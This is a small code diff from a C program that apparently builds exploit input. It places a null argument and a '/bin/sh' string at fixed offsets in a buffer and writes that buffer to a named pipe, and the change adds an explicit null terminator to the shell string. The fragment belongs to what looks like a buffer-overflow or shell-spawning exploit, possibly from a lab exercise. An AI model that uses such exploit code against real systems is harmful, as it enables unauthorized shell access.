@@ -61,7 +61,7 @@ int main(void)
   // leave 4 bytes for null arg at bufr + 179
   strcpy(bufr + 179, "\x01\x01\x01\x01");
   // location of "/bin/sh" bufr + 183
-  strcpy(bufr + 183, "/bin/sh");
+  strcpy(bufr + 183, "/bin/sh\x00");
 
   writecmd(PIPEPATH, bufr);
   
